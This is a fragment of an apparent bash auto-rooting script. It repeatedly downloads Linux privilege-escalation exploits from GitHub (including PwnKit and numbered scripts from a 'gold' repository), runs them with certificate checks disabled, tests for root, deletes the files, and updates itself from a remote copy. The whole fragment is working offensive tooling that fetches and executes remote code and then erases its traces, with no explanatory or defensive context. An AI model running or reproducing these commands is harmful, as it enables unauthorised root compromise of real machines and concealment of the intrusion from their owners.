...
wget -q --no-check-certificate https://raw.githubusercontent.com/noblesse5/gold/master/xtra/23674.sh -O exploit.sh
bash exploit.sh
checkroot
rm -rf exploit.sh
rm -rf a.c
...
#4034
wget https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh -O exploit.sh
bash exploit.sh
checkroot;
rm -rf exploit.sh
rm -rf *.c
...
wget -q --no-check-certificate https://raw.githubusercontent.com/noblesse5/gold/master/xtra/37293.sh -O exploit.sh
bash exploit.sh
checkroot;
rm -rf exploit.sh
rm -rf *.c
...
wget -q --no-check-certificate https://raw.githubusercontent.com/noblesse5/gold/master/xtra/8055.c -O exploit.c
...
wget -q --no-check-certificate https://raw.githubusercontent.com/noblesse5/gold/master/xtra/10255.sh -O exploit.sh
bash exploit.sh
checkroot
rm -rf exploit.sh
...
wget -q --no-check-certificate https://raw.githubusercontent.com/noblesse5/gold/master/xtra/42334.sh -O exploit.sh
bash exploit.sh
checkroot
rm -rf exploit.sh
...
wget -q --no-check-certificate https://raw.githubusercontent.com/noblesse5/gold/master/gold-D.sh -O $0
sleep 2
}
...
function s0 {
ck=$(wget https://raw.githubusercontent.com/noblesse5/gold/master/gold-D.sh --timeout=5 -q -O - | grep "ver=" | cut -d"=" -f2)
